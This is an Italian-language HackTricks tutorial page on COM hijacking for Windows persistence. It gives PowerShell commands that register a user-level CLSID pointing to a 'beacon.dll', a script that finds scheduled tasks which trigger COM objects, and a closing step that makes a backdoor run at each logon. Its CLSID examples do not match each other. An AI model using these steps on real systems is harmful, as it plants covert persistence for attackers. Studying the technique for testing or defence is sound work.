# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Ricerca di componenti COM inesistenti

Poiché i valori di HKCU possono essere modificati dagli utenti, **COM Hijacking** potrebbe essere utilizzato come un **meccanismo persistente**. Utilizzando `procmon` è facile trovare registri COM cercati che non esistono e che un attaccante potrebbe creare per persistere. Filtri:

- Operazioni **RegOpenKey**.
- dove il _Risultato_ è **NOME NON TROVATO**.
- e il _Percorso_ termina con **InprocServer32**.

Una volta deciso quale COM inesistente impersonare, esegui i seguenti comandi. _Fai attenzione se decidi di impersonare un COM che viene caricato ogni pochi secondi, poiché potrebbe essere eccessivo._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Componenti COM del Task Scheduler suscettibili di hijacking

Windows Tasks utilizzano Trigger personalizzati per chiamare oggetti COM e poiché vengono eseguiti tramite il Task Scheduler, è più facile prevedere quando verranno attivati.

<pre class="language-powershell"><code class="lang-powershell"># Mostra i CLSID COM
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Nome Task: " $Task.TaskName
Write-Host "Percorso Task: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Output di esempio:
<strong># Nome Task:  Esempio
</strong># Percorso Task:  \Microsoft\Windows\Esempio\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [più simile a quello precedente...]</code></pre>

Controllando l'output puoi selezionare uno che verrà eseguito **ogni volta che un utente accede** ad esempio.

Ora cercando il CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** e in HKLM e HKCU, di solito scoprirai che il valore non esiste in HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Quindi, puoi semplicemente creare l'entry HKCU e ogni volta che l'utente accede, il tuo backdoor verrà attivato.

{{#include ../../banners/hacktricks-training.md}}
